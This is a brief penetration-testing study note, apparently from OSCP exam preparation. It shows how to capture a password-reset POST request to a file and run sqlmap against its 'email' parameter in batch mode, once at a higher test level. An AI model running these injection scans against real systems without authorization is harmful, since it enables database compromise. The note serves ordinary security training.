[[Synced OSCP Notes/Tools/SQLmap|SQLmap]]

Intercept a web request of "test", copy the post request and save it to a file called reset.req

Feed this to SQLmap

```
sqlmap -r reset.req -p email --batch
```

```
sqlmap -r reset.req -p email --batch --level 3
```